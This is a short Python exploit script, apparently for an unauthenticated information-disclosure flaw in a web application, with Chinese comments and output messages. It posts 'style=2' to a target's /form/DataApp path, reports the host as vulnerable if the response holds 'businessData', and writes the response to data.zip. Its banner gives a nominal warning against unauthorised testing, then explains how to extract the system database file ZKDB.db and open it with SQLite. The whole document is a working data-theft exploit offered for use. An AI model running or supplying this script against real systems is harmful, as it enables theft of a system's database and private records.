import requests
import sys
import re
import os

def check(url):
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    url1 = url + "/form/DataApp"
    try:
        data = "style=2"
        req = requests.post(url1, data=data, headers=header, timeout=20)
        a = req.content
        if req.status_code == 200 and 'businessData' in req.text:
            print(url + ' ' + '存在漏洞！' + 'data.zip下载成功')
            with open('data.zip', 'wb') as ff:
                ff.write(a)
        else:
            print(url + ' ' + '不存在漏洞！')
    except Exception as e:
        print(e)

if __name__ == "__main__":
    try:
        print('''
        请熟读网络安全法，禁止做非授权渗透测试
        获取data.zip文件，解压出文件data，重命名为data1.zip，再解压出来就是系统数据库文件ZKDB.db，使用SQLite数据库管理软件可打开ZKDB.db
        使用方法：
        [+] python3 exp.py http://192.168.1.201/ 验证单个URL,下载系统数据库文件
        ''')
        check(sys.argv[1])
    except Exception as e:
        print(e)
